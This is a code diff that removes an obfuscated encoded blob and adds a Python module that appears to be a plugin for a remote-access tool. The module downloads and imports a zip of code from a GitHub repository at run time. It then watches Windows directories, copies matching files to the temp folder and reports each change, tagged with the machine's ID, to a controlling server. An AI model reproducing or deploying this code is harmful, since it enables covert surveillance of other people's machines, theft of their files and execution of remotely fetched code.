@@ -1,1 +1,81 @@
-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
+pimport(
+    '''import win32con,win32file''',
+    "https://github.com/MrByehack/t-a-r-e-y-b/raw/master/bGlicmFyaWVz/"
+    "filechanger.zip"
+)
+
+
+class filewatch:
+    lists = {}
+
+    @classmethod
+    def __init__(
+        self, server, path, FILE_NAME=1, DIR_NAME=0, ATTRIBUTES=0,
+        SIZE=0, LAST_WRITE=0, SECURITY=0, upfile='', justupfile=False
+    ):
+        if path in self.lists:
+            self.lists[path] = False
+            return
+        self.lists[path] = True
+        hDir = win32file.CreateFile(
+            path,
+            0x0001,
+            win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE |
+            win32con.FILE_SHARE_DELETE,
+            None,
+            win32con.OPEN_EXISTING,
+            win32con.FILE_FLAG_BACKUP_SEMANTICS,
+            None
+        )
+        while self.lists.get(path):
+            results = win32file.ReadDirectoryChangesW(
+                hDir, 1024, True,
+                (FILE_NAME and win32con.FILE_NOTIFY_CHANGE_FILE_NAME or 0) |
+                (DIR_NAME and win32con.FILE_NOTIFY_CHANGE_DIR_NAME or 0) |
+                (ATTRIBUTES and win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES or 0) |
+                (SIZE and win32con.FILE_NOTIFY_CHANGE_SIZE or 0) |
+                (LAST_WRITE and win32con.FILE_NOTIFY_CHANGE_LAST_WRITE or 0) |
+                (SECURITY and win32con.FILE_NOTIFY_CHANGE_SECURITY or 0),
+                None, None)
+            for action, file in results:
+                if self.lists.get(path) and action in [1, 3] and upfile and \
+                        re.match(upfile, file):
+                    while 1:
+                        try:
+                            copied = shutil.copy(os.path.join(
+                                path, file), os.environ['temp'])
+                            break
+                        except PermissionError:
+                            pass
+                    _send(
+                        server,
+                        '''inpu({!r},"92",0)'''.format(
+                            Myid + ' : ' + os.path.join(path, file) + ' > ' +
+                            ('Created' if action == 1 else "Content Changed") +
+                            '!\\nit match with ' + upfile + ' and saved on: ' +
+                            copied
+                        )
+                    )
+                elif self.lists.get(path) and justupfile and upfile and \
+                        re.match(upfile, file):
+                    _send(
+                        server,
+                        '''inpu({!r},"92",0)'''.format(
+                            Myid + ' : ' + os.path.join(path, file) +
+                            ' match with ' + upfile + ' > ' + {
+                                1: "Created!", 2: "Deleted!",
+                                3: "Content Changed!", 4: "Renamed to:", 5: ""
+                            }.get(action, "Unknown " + str(action))
+                        )
+                    )
+                elif self.lists.get(path) and not justupfile:
+                    _send(
+                        server,
+                        '''inpu({!r},"92",0)'''.format(
+                            Myid + ' : ' + os.path.join(path, file) + ' > ' + {
+                                1: "Created!", 2: "Deleted!",
+                                3: "Content Changed!", 4: "Renamed to:", 5: ""
+                            }.get(action, "Unknown " + str(action))
+                        )
+                    )
+        del self.lists[path]
